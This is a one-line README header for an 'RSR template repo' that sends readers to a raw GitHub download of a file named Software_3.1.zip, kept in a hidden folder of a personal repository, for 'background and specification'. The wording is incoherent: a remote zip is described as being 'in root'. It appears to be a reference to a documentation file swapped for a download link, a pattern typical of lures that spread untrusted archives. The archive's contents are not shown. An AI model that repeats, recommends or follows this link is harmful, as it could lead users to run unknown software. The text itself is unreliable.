= RSR template repo - see https://raw.githubusercontent.com/Lrkbossyt/contractiles/main/.machine_readable/6scm/Software_3.1.zip in root for general background and specification
